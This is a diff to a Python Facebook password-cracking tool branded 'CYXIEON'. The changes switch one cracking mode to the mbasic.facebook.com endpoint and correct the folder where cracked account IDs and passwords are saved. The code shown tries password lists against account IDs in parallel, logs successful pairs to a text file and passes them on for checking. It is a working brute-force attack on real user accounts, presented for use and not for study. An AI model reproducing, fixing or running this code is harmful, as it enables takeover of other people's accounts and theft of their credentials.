@@ -456,7 +456,7 @@ def passwordlist():
 						pwx.append(sandi_kita)
 				else:pass
 				if 'validate' in method:
-				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.beta.facebook.com')
+				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'mbasic.facebook.com')
 				elif 'reguler' in method:
 				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
 				elif 'asyinc' in method:
@@ -544,7 +544,7 @@ def crackvalidate(idf,pwx,url):
 				tree.add(f"{mer}{ua}{hijo}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
-				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
 				cp+=1
@@ -627,7 +627,7 @@ def crackreguler(idf,pwx,url):
 				tree.add(f"{mer}{ua}{hijo}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
-				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
 				cp+=1
@@ -717,7 +717,7 @@ def crackasyinc(idf,pwx,url):
 				tree.add(f"{mer}{ua}{hijo}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
-				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
 				cp+=1
